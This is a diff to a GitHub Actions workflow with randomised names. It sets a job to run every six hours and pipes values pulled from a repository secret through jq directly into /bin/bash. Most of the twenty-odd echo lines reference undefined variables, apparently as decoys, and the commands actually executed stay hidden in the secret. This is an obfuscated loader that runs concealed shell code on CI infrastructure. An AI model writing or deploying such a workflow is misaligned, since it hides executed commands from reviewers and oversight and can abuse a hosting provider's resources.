@@ -3,36 +3,35 @@ name: suyanzhn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
-
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: suyanzhn
         env:
-          kxur6: ${{ secrets.kxur6 }}
+          onfs5: ${{ secrets.onfs5 }}
         run: |
-          echo $kxur6 | jq -r .hnuc23 | /bin/bash
-          echo $ampo84031 | jq -r .a8870 | /bin/bash
-          echo $hlb39 | jq -r .p8961 | /bin/bash
-          echo $elbeo52617 | jq -r .rnv37 | /bin/bash
-          echo $v32 | jq -r .t751 | /bin/bash
-          echo $k85072 | jq -r .vli8 | /bin/bash
-          echo $xn775 | jq -r .jmajx4 | /bin/bash
-          echo $xpc03119 | jq -r .fhzg0 | /bin/bash
-          echo $jjyyf0 | jq -r .hr86 | /bin/bash
-          echo $kluq513 | jq -r .mkhug859 | /bin/bash
-          echo $rczs9 | jq -r .li6409 | /bin/bash
-          echo $usm3 | jq -r .vrmw04 | /bin/bash
-          echo $ljx17827 | jq -r .z35278 | /bin/bash
-          echo $jw3 | jq -r .os1348 | /bin/bash
-          echo $r25 | jq -r .coj6 | /bin/bash
-          echo $gsyh10 | jq -r .nbyp14508 | /bin/bash
-          echo $r1 | jq -r .t5 | /bin/bash
-          echo $th5746 | jq -r .hwz82295 | /bin/bash
-          echo $xbj19785 | jq -r .fwiy1574 | /bin/bash
-          echo $jjlsy115 | jq -r .hqef7579 | /bin/bash
+          echo $onfs5 | jq -r .hhare2 | /bin/bash
+          echo $r44 | jq -r .asps241 | /bin/bash
+          echo $jxz1486 | jq -r .tui7 | /bin/bash
+          echo $ou3331 | jq -r .qmlbm48 | /bin/bash
+          echo $zyw34020 | jq -r .alew78 | /bin/bash
+          echo $qyb11 | jq -r .crckw8 | /bin/bash
+          echo $kbh452 | jq -r .cdtt37415 | /bin/bash
+          echo $idlf6737 | jq -r .rps14 | /bin/bash
+          echo $tiwgx9366 | jq -r .iti5145 | /bin/bash
+          echo $mstob71602 | jq -r .huz93 | /bin/bash
+          echo $ghip3 | jq -r .z480 | /bin/bash
+          echo $rqv75879 | jq -r .onj2 | /bin/bash
+          echo $x3 | jq -r .h88 | /bin/bash
+          echo $ayz7623 | jq -r .swd40 | /bin/bash
+          echo $amvd69 | jq -r .nfy5156 | /bin/bash
+          echo $f3 | jq -r .edgc8458 | /bin/bash
+          echo $zrdmc66 | jq -r .cla2 | /bin/bash
+          echo $yoq16904 | jq -r .hi50 | /bin/bash
+          echo $f04 | jq -r .scf45 | /bin/bash
+          echo $sqt908 | jq -r .h2804 | /bin/bash
+          echo $qnty576 | jq -r .o9 | /bin/bash
 
